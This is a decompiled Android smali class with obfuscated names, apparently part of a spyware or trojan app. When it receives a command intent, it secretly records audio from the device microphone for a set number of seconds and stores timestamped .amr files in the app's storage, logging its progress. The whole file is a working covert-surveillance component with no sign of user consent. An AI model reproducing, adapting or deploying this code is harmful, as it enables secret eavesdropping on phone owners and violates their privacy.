.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;
.super Landroid/app/IntentService;


# instance fields
.field a:Z

.field b:Lwocwvy/czyxoxmbauu/slsa/b;

.field c:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "cpysnikhf"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->a:Z

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 10

    new-instance v7, Landroid/media/MediaRecorder;

    invoke-direct {v7}, Landroid/media/MediaRecorder;-><init>()V

    const-string v0, "SOUND"

    const-string v1, "START RECORD SOUND"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x0

    iput-boolean v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->a:Z

    const/4 v0, 0x1

    invoke-virtual {v7, v0}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    const/4 v1, 0x3

    invoke-virtual {v7, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    invoke-virtual {v7, v0}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    invoke-virtual {v7, p2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    new-instance v8, Ljava/lang/Thread;

    new-instance v9, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;

    move-object v0, v9

    move-object v1, p0

    move v2, p4

    move-object v3, p1

    move-object v4, v7

    move-object v5, p2

    move-object v6, p3

    invoke-direct/range {v0 .. v6}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;ILandroid/content/Context;Landroid/media/MediaRecorder;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v8, v9}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    :try_start_0
    invoke-virtual {v7}, Landroid/media/MediaRecorder;->prepare()V

    invoke-virtual {v7}, Landroid/media/MediaRecorder;->start()V

    invoke-virtual {v8}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 5

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "startRecordSound"

    const-string v2, "start"

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :try_start_0
    const-string v0, "time"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    if-lez p1, :cond_0

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "MM-dd-yyyy_HH:mm:ss"

    sget-object v2, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v0, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "/RecordSound_"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ".amr"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v2, 0x0

    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->c:Ljava/lang/String;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "FILE REC"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->c:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "Time"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->c:Ljava/lang/String;

    invoke-virtual {p0, p0, v1, v0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "startRecordSound"

    const-string v2, "stop"

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "cpysnikhf"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ERROR"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, v1, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method
